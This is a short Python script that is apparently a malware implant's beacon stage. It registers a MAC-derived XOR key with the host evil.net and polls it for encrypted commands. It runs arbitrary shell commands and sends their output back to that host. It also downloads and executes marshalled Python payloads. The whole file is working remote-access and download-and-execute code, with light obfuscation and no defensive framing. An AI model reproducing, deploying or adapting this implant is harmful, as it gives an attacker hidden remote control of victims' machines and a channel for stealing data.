def entrypoint(session_id):
    import uuid
    import base64
    import requests
    import json
    import subprocess
    import time
    import marshal
    
    
    def rolling_xor(data, key):
        encrypted = b''
        for i, c in enumerate(data):
            encrypted += bytes((c ^ key[i % len(key)],))
        return encrypted

    key = uuid.getnode().to_bytes(length=6, byteorder='big')
    
    session = requests.session()
    session.cookies.set('id', session_id)
    
    session.post('http://evil.net/set_key', json={'key': base64.b64encode(key).decode()})
    
    while True:
        data = base64.b64decode(session.get('http://evil.net/beacon_2').content)
        response = json.loads(rolling_xor(data, key).decode())
        
        if response['command'] == 'sleep':
            time.sleep(response.get('parameters', [3])[0])

        elif response['command'] == 'shell':
            output = subprocess.check_output(response.get('parameters')[0], shell=True).decode()
            output_encrypted = rolling_xor(json.dumps({'output': output}).encode(), key)
            session.post('http://evil.net/shell_2', data=base64.b64encode(output_encrypted))

        elif response['command'] == 'download_and_execute':
            new_payload = session.get(response.get('parameters')[0]).content
            session_id = session.cookies['id']
            exec(marshal.loads(rolling_xor(new_payload, key)), globals(), locals())
            break


entrypoint(session_id)